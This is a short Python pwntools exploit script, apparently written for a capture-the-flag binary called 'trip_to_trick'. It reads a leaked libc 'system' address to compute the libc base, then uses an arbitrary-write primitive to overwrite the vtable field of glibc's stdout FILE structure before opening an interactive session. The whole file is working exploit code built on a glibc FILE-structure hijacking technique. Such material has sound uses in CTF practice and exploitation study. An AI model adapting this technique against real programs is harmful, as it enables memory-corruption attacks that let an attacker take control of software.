#!/usr/bin/python
from pwn import *

env = {
    'LD_PRELOAD': os.path.abspath('libc.so.6')
}

elf = ELF('./trip_to_trick')
libc = ELF('./libc.so.6')

p = process(['./ld-linux-x86-64.so.2','./trip_to_trick'], env=env)
gdb.attach(p)

context.log_level="debug"

p.recvuntil("gift : ")
system = int(p.recvline()[:-1], 16)

libc.address = system - libc.symbols.system
log.info("Libc : 0x{:x}".format(libc.address))

def write_at_addr(addr, value):
    p.sendlineafter(" : ", "{:x} \n {:x} ".format(addr, value))

write_at_addr(libc.symbols["_IO_2_1_stdout_"] + 216, libc.address + 0x1ba960)


p.interactive()
